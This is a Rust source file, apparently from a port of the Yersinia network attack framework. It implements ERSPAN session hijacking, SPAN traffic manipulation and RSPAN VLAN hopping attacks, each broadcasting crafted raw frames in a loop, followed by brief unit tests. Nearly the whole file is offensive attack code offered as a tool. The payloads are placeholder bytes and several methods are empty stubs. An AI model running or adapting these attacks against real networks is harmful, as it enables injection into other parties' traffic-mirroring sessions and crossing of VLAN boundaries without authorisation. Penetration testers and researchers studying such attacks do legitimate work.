//! ERSPAN Attack Implementations
use super::packet::ErspanPacket;
use async_trait::async_trait;
use std::net::Ipv4Addr;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct ErspanSessionHijackingAttack {
    pub session_id: u16,
    pub source_ip: Ipv4Addr,
    pub destination_ip: Ipv4Addr,
    pub injected_frames: Vec<Vec<u8>>,
}

impl ErspanSessionHijackingAttack {
    pub fn new(session_id: u16, src: Ipv4Addr, dst: Ipv4Addr) -> Self {
        Self {
            session_id,
            source_ip: src,
            destination_ip: dst,
            injected_frames: Vec::new(),
        }
    }

    pub fn with_frames(mut self, frames: Vec<Vec<u8>>) -> Self {
        self.injected_frames = frames;
        self
    }

    pub fn build_packets(&self) -> Vec<ErspanPacket> {
        let mut packets = Vec::new();

        for (seq, frame) in self.injected_frames.iter().enumerate() {
            let pkt = ErspanPacket::new(self.session_id, frame.clone()).with_sequence(seq as u32);
            packets.push(pkt);
        }

        packets
    }
}

#[async_trait]
impl Attack for ErspanSessionHijackingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(100);
        let packets = self.build_packets();

        if packets.is_empty() {
            return Ok(());
        }

        let mut packet_idx = 0;

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let erspan_packet = &packets[packet_idx % packets.len()];
            let erspan_bytes = erspan_packet.to_bytes();

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, erspan_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending ERSPAN hijack packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            packet_idx += 1;
            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "ERSPAN Session Hijacking"
    }
}

#[derive(Debug, Clone)]
pub struct SpanTrafficManipulationAttack {
    pub session_id: u16,
    pub manipulate_sequence: bool,
    pub inject_malicious_frames: bool,
}

impl SpanTrafficManipulationAttack {
    pub fn new(session_id: u16) -> Self {
        Self {
            session_id,
            manipulate_sequence: true,
            inject_malicious_frames: false,
        }
    }

    pub fn with_malicious_injection(mut self) -> Self {
        self.inject_malicious_frames = true;
        self
    }

    pub fn build_manipulation_packets(&self) -> Vec<ErspanPacket> {
        let mut packets = Vec::new();

        if self.manipulate_sequence {
            // Send packets with out-of-order sequence numbers
            for seq in [100, 50, 200, 75].iter() {
                let frame = vec![0xCC; 64];
                packets.push(ErspanPacket::new(self.session_id, frame).with_sequence(*seq));
            }
        }

        if self.inject_malicious_frames {
            // Inject crafted frames
            let malicious_frame = vec![0xFF; 100];
            packets.push(ErspanPacket::new(self.session_id, malicious_frame));
        }

        packets
    }
}

#[async_trait]
impl Attack for SpanTrafficManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(50);
        let packets = self.build_manipulation_packets();

        let mut packet_idx = 0;

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let erspan_packet = &packets[packet_idx % packets.len()];
            let erspan_bytes = erspan_packet.to_bytes();

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, erspan_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending SPAN manipulation packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            packet_idx += 1;
            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "SPAN Traffic Manipulation"
    }
}

#[derive(Debug, Clone)]
pub struct RspanVlanHoppingAttack {
    pub source_vlan: u16,
    pub target_vlan: u16,
    pub session_id: u16,
}

impl RspanVlanHoppingAttack {
    pub fn new(source_vlan: u16, target_vlan: u16, session_id: u16) -> Self {
        Self {
            source_vlan,
            target_vlan,
            session_id,
        }
    }

    pub fn build_packets(&self) -> Vec<ErspanPacket> {
        let mut packets = Vec::new();

        // Create ERSPAN packet claiming to be from source VLAN
        // but will be processed in target VLAN
        let frame = vec![0xDD; 128];
        let pkt = ErspanPacket::new(self.session_id, frame).with_vlan(self.target_vlan);

        packets.push(pkt);

        packets
    }
}

#[async_trait]
impl Attack for RspanVlanHoppingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(200);
        let packets = self.build_packets();

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            for erspan_packet in &packets {
                let erspan_bytes = erspan_packet.to_bytes();

                let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
                let src_mac = MacAddress(ctx.interface.mac_address.0);

                let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, erspan_bytes);
                let frame_bytes = frame.to_bytes();

                if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                    ctx.stats.increment_errors();
                    eprintln!("Error sending RSPAN VLAN hopping packet: {}", e);
                } else {
                    ctx.stats.increment_packets_sent();
                    ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
                }
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "RSPAN VLAN Hopping"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_session_hijacking() {
        let attack = ErspanSessionHijackingAttack::new(
            10,
            Ipv4Addr::new(192, 168, 1, 1),
            Ipv4Addr::new(192, 168, 1, 2),
        )
        .with_frames(vec![vec![0xAA; 64], vec![0xBB; 64]]);

        let packets = attack.build_packets();
        assert_eq!(packets.len(), 2);
    }

    #[test]
    fn test_traffic_manipulation() {
        let attack = SpanTrafficManipulationAttack::new(5).with_malicious_injection();
        let packets = attack.build_manipulation_packets();
        assert!(!packets.is_empty());
    }

    #[test]
    fn test_vlan_hopping() {
        let attack = RspanVlanHoppingAttack::new(10, 20, 1);
        let packets = attack.build_packets();
        assert_eq!(packets.len(), 1);
        assert_eq!(packets[0].erspan_header.vlan, 20);
    }
}
